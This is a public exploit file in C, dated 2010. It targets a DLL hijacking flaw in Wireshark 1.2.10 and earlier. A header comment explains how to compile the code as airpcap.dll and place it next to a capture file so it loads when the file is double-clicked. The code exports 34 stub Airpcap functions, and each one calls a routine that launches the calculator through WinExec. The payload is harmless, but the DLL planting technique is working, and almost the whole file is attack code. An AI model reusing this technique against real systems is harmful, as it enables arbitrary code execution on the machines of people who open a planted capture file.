/*
Exploit Title: Wireshark <= 1.2.10 DLL Hijacking Exploit (airpcap.dll)
Date: 24/08/2010
Author: TheLeader
Email: gsog2009 [a7] hotmail [d0t] com
Software Link: http://www.wireshark.org/download.html
Version: 1.2.10 and prior
Tested on: Windows 7 x86 (6.1.7600)

As seen on Metasploit blog (rock on HDM!): 
http://blog.metasploit.com/2010/08/exploiting-dll-hijacking-flaws.html

Probably gonna see alot of these bugs getting exploited in the near future..

Compile and rename to airpcap.dll, create a file in the same dir with one of the following extensions.

Default Wireshark file extension associations:
.5vw / .acp / .apc / .atc / .bfr / .cap / .enc / .erf / .fdc / .pcap / .pcapng /
.pkt / .rf5 / .snoop / .syc / .tpc / .tr1 / .trace / .trc / .wpc / .wpz

Double click & watch a nice calculator pop =]
Shouts to all the great guys at forums.hacking.org.il
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void AirpcapGetDeviceList() { evil(); }
DLLIMPORT void AirpcapFreeDeviceList() { evil(); }
DLLIMPORT void AirpcapOpen() { evil(); }
DLLIMPORT void AirpcapClose() { evil(); }
DLLIMPORT void AirpcapGetLinkType() { evil(); }
DLLIMPORT void AirpcapSetLinkType() { evil(); }
DLLIMPORT void AirpcapSetKernelBuffer() { evil(); }
DLLIMPORT void AirpcapSetFilter() { evil(); }
DLLIMPORT void AirpcapGetMacAddress() { evil(); }
DLLIMPORT void AirpcapSetMinToCopy() { evil(); }
DLLIMPORT void AirpcapGetReadEvent() { evil(); }
DLLIMPORT void AirpcapRead() { evil(); }
DLLIMPORT void AirpcapGetStats() { evil(); }
DLLIMPORT void AirpcapTurnLedOn() { evil(); }
DLLIMPORT void AirpcapTurnLedOff() { evil(); }
DLLIMPORT void AirpcapGetDeviceChannel() { evil(); }
DLLIMPORT void AirpcapSetDeviceChannel() { evil(); }
DLLIMPORT void AirpcapGetFcsPresence() { evil(); }
DLLIMPORT void AirpcapSetFcsPresence() { evil(); }
DLLIMPORT void AirpcapGetFcsValidation() { evil(); }
DLLIMPORT void AirpcapSetFcsValidation() { evil(); }
DLLIMPORT void AirpcapGetDeviceKeys() { evil(); }
DLLIMPORT void AirpcapSetDeviceKeys() { evil(); }
DLLIMPORT void AirpcapGetDecryptionState() { evil(); }
DLLIMPORT void AirpcapSetDecryptionState() { evil(); }
DLLIMPORT void AirpcapStoreCurConfigAsAdapterDefault() { evil(); }
DLLIMPORT void AirpcapGetVersion() { evil(); }
DLLIMPORT void AirpcapGetDriverDecryptionState() { evil(); }
DLLIMPORT void AirpcapSetDriverDecryptionState() { evil(); }
DLLIMPORT void AirpcapGetDriverKeys() { evil(); }
DLLIMPORT void AirpcapSetDriverKeys() { evil(); }
DLLIMPORT void AirpcapSetDeviceChannelEx() { evil(); }
DLLIMPORT void AirpcapGetDeviceChannelEx() { evil(); }
DLLIMPORT void AirpcapGetDeviceSupportedChannels() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}
